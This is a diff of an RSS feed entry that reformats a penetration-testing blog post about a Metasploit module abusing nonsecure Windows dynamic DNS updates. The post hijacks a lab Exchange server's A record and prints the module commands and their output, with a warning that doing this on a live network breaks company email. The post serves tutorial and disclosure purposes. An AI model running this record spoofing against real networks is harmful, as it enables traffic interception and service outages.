@@ -16,32 +16,19 @@
       <pubDate>Sun, 25 Jun 2017 07:35:28 -0500</pubDate>
       
       <guid>https://malicious.link/post/2017/dynamic-dns-update-module/</guid>
-      <description>
-
-&lt;p&gt;&amp;ldquo;Secure&amp;rdquo; DNS updates is the default in Windows, but there is an option to allow &amp;ldquo;Nonsecure&amp;rdquo; updates. I have seen this changed when non-Windows DHCP servers are used (eg Access Points), this opens a network up to some pretty nifty attacks that a Metasploit module just hit the ground for.&lt;/p&gt;
-
-&lt;p&gt;&lt;center&gt;&lt;img src=&#34;https://malicious.link/images/2017/nonsecure_dns_updates.png&#34; alt=&#34;&#34; /&gt;&lt;/center&gt;&lt;/p&gt;
-
+      <description>&lt;p&gt;&amp;ldquo;Secure&amp;rdquo; DNS updates is the default in Windows, but there is an option to allow &amp;ldquo;Nonsecure&amp;rdquo; updates. I have seen this changed when non-Windows DHCP servers are used (eg Access Points), this opens a network up to some pretty nifty attacks that a Metasploit module just hit the ground for.&lt;/p&gt;
+&lt;center&gt;![](/images/2017/nonsecure_dns_updates.png)&lt;/center&gt;
 &lt;p&gt;The module was originally written by &lt;a href=&#34;https://twitter.com/kingsabri&#34;&gt;King Sabri&lt;/a&gt;, with many touch ups and the spoofing capability by &lt;a href=&#34;https://twitter.com/busterbcook&#34;&gt;busterbcook&lt;/a&gt;&lt;/p&gt;
-
 &lt;p&gt;You can read up on the pull request in &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/8599&#34;&gt;pr/#8599&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Just to drive home the point I&amp;rsquo;ll be using my Exchange server as a target:&lt;/p&gt;
-
-&lt;p&gt;&lt;center&gt; &lt;strong&gt;You will break email for the entire company if you do this on a live network. Doing so is possibly a resume generating event.&lt;/strong&gt;&lt;/center&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;center&gt;&lt;img src=&#34;https://malicious.link/images/2017/before_dns_update.png&#34; alt=&#34;&#34; /&gt;&lt;/center&gt;&lt;/p&gt;
-
+&lt;p&gt;Just to drive home the point I&#39;ll be using my Exchange server as a target:&lt;/p&gt;
+&lt;center&gt; **You will break email for the entire company if you do this on a live network. Doing so is possibly a resume generating event.**&lt;/center&gt;
+&lt;center&gt;![](/images/2017/before_dns_update.png)&lt;/center&gt;
 &lt;p&gt;If you are going to be overwriting an existing record make sure to keep a note of the real IP address of the host you are overwriting so that you can fix the record afterwards.&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;$ dig @192.168.80.10 sdexchange.sittingduck.info
 
 ;; ANSWER SECTION:
 sdexchange.sittingduck.info. 1200 IN	A	192.168.80.13
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Here is what the module looks like:&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here is what the module looks like:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/admin/dns/dyn_dns_update
 msf auxiliary(dyn_dns_update) &amp;gt; show options
 
@@ -63,10 +50,7 @@ Auxiliary action:
    Name    Description
    ----    -----------
    UPDATE  Add or update a record. (default)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;It has 3 different actions, but you&amp;rsquo;ll mostly want &lt;code&gt;UPDATE&lt;/code&gt;. &lt;code&gt;UPDATE&lt;/code&gt; will automatically delete a record if it exists already and then add the record back with your specified settings.&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It has 3 different actions, but you&#39;ll mostly want &lt;code&gt;UPDATE&lt;/code&gt;. &lt;code&gt;UPDATE&lt;/code&gt; will automatically delete a record if it exists already and then add the record back with your specified settings.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; show actions
 
 Auxiliary actions:
@@ -77,10 +61,7 @@ Auxiliary actions:
    DELETE  Delete an existing record.
    UPDATE  Add or update a record. (default)
 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Here are the settings I chose. Notice the IP address that I&amp;rsquo;m injecting isn&amp;rsquo;t on the same subnet as the domain.&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here are the settings I chose. Notice the IP address that I&#39;m injecting isn&#39;t on the same subnet as the domain.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; set DOMAIN sittingduck.info
 DOMAIN =&amp;gt; sittingduck.info
 msf auxiliary(dyn_dns_update) &amp;gt; set HOSTNAME sdexchange
@@ -89,10 +70,7 @@ msf auxiliary(dyn_dns_update) &amp;gt; set IP 100.100.100.100
 IP =&amp;gt; 100.100.100.100
 msf auxiliary(dyn_dns_update) &amp;gt; set RHOST 192.168.80.10
 RHOST =&amp;gt; 192.168.80.10
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;And the output:&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And the output:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; run
 
 [+] Found existing A record for sdexchange.sittingduck.info
@@ -102,12 +80,8 @@ RHOST =&amp;gt; 192.168.80.10
 [+] The record &#39;sdexchange.sittingduck.info =&amp;gt; 100.100.100.100&#39; has been added!
 [*] Auxiliary module execution completed
 msf auxiliary(dyn_dns_update) &amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;game-over&#34;&gt;#Game Over&lt;/h2&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/after_dns_update.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;game-over&#34;&gt;#Game Over&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/after_dns_update.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;This will stay until fixed or another dynamic DNS update is performed from the original server (every 24 hours or so).&lt;/p&gt;
 </description>
     </item>
